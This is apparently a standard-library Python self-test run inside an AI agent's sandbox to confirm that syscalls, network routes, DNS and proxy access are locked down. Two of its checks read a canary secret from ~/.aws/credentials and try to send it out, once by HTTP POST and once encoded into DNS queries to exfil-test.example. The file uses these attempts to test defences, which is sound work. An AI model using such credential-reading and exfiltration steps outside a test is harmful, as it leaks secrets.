"""In-sandbox self-test, run by ``agent-sandbox verify`` inside the agent container.

Standalone (standard library only) because it is copied into the agent image.
Each check prints one JSON line; the exit code is non-zero if any check fails.
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import errno
import json
import os
import platform
import re
import socket
import sys
import urllib.error
import urllib.request
from collections.abc import Callable
from pathlib import Path

EPERM = errno.EPERM
TIMEOUT = 20.0

# Syscall numbers: (x86_64, aarch64).
SYSCALLS = {
    "ptrace": (101, 117),
    "keyctl": (250, 219),
    "unshare": (272, 97),
    "mount": (165, 40),
    "bpf": (321, 280),
    "io_uring_setup": (425, 425),
    "perf_event_open": (298, 241),
    "userfaultfd": (323, 282),
    "process_vm_readv": (310, 270),
    "socket": (41, 198),
}
CLONE_NEWUSER = 0x10000000
AF_PACKET, SOCK_RAW = 17, 3

Check = Callable[[argparse.Namespace], tuple[bool, str]]
CHECKS: list[tuple[str, Check]] = []


def check(name: str) -> Callable[[Check], Check]:
    def register(func: Check) -> Check:
        CHECKS.append((name, func))
        return func

    return register


def _status() -> dict[str, str]:
    lines = Path("/proc/self/status").read_text(encoding="ascii").splitlines()
    return dict(line.split(":\t", 1) for line in lines if ":\t" in line)


@check("runs as a non-root user")
def _non_root(_args):
    uid = os.getuid()
    return uid != 0, f"uid={uid}"


@check("no capabilities")
def _no_caps(_args):
    status = _status()
    eff, bnd = status.get("CapEff", "?").strip(), status.get("CapBnd", "?").strip()
    return int(eff, 16) == 0 and int(bnd, 16) == 0, f"CapEff={eff} CapBnd={bnd}"


@check("no_new_privs and seccomp filter active")
def _nnp_seccomp(_args):
    status = _status()
    nnp, mode = status.get("NoNewPrivs", "?").strip(), status.get("Seccomp", "?").strip()
    return nnp == "1" and mode == "2", f"NoNewPrivs={nnp} Seccomp={mode}"


@check("root filesystem is read-only")
def _read_only_root(_args):
    try:
        with open("/usr/local/.agent-sandbox-write-test", "w"):
            pass
    except OSError as exc:
        return exc.errno == errno.EROFS, os.strerror(exc.errno or 0)
    return False, "write succeeded"


@check("dangerous syscalls return EPERM")
def _syscalls(_args):
    index = {"x86_64": 0, "aarch64": 1}.get(platform.machine())
    if index is None:
        return False, f"unsupported architecture {platform.machine()}"
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    libc.syscall.restype = ctypes.c_long
    calls = {
        "ptrace": (0, 0, 0, 0),
        "keyctl": (0, -3, 1),
        "unshare": (CLONE_NEWUSER,),
        "mount": (b"none", b"/tmp", b"tmpfs", 0, None),
        "bpf": (0, None, 0),
        "io_uring_setup": (1, None),
        "perf_event_open": (None, 0, -1, -1, 0),
        "userfaultfd": (0,),
        "process_vm_readv": (os.getpid(), None, 0, None, 0, 0),
        "socket": (AF_PACKET, SOCK_RAW, 0),
    }
    allowed = []
    for name, args in calls.items():
        ctypes.set_errno(0)
        result = libc.syscall(ctypes.c_long(SYSCALLS[name][index]), *args)
        err = ctypes.get_errno()
        if result != -1 or err != EPERM:
            allowed.append(f"{name}(ret={result}, errno={err})")
    return not allowed, "all blocked" if not allowed else "not blocked: " + ", ".join(allowed)


@check("no direct route to the internet")
def _no_route(_args):
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=5).close()
    except OSError as exc:
        return True, exc.strerror or str(exc) or "timeout"
    return False, "connected to 1.1.1.1:443 without the proxy"


@check("external DNS is sinkholed")
def _dns(_args):
    try:
        addresses = socket.getaddrinfo("example.com", 443)
    except socket.gaierror as exc:
        return True, str(exc)
    return False, f"resolved to {addresses[0][4][0]}"


def _fetch(url: str, data: bytes | None = None) -> tuple[int | None, str]:
    request = urllib.request.Request(url, data=data)  # noqa: S310 - fixed test URLs
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:  # noqa: S310
            return response.status, ""
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as exc:
        return None, str(getattr(exc, "reason", exc))


@check("allowlisted host reachable through the proxy")
def _allowed(args):
    status, detail = _fetch(f"https://{args.allowed_host}/")
    return status is not None and status < 500, f"status={status} {detail[:80]}".strip()


@check("other hosts are refused by the proxy")
def _denied(args):
    status, detail = _fetch(f"https://{args.denied_host}/")
    refused = status == 403 or "403" in detail
    return refused, f"status={status} {detail[:80]}".strip()


def _canary_secret() -> str | None:
    credentials = Path.home() / ".aws" / "credentials"
    if not credentials.exists():
        return None
    match = re.search(r"aws_secret_access_key = (\S+)", credentials.read_text(encoding="utf-8"))
    return match.group(1) if match else None


@check("canary exfiltration is blocked")
def _exfiltration(args):
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    status, detail = _fetch(f"http://{args.allowed_host}/upload", data=f"k={secret}".encode())
    return status == 403 and "canary" in detail, f"status={status} {detail[:80]}".strip()


@check("canary in a DNS query is caught by the sinkhole")
def _dns_exfiltration(_args):
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    encoded = secret.encode().hex()
    name = f"{encoded[:60]}.{encoded[60:]}.exfil-test.example"
    try:
        socket.getaddrinfo(name, 443)
    except socket.gaierror:
        return True, "query answered NXDOMAIN (alert expected on the host)"
    return False, "query resolved"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="selftest")
    parser.add_argument("--allowed-host", default="pypi.org")
    parser.add_argument("--denied-host", default="example.com")
    args = parser.parse_args(argv)
    failed = 0
    for name, func in CHECKS:
        try:
            ok, detail = func(args)
        except Exception as exc:  # A crashing check is a failed check.
            ok, detail = False, f"{type(exc).__name__}: {exc}"
        failed += not ok
        print(json.dumps({"check": name, "ok": ok, "detail": detail}), flush=True)
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
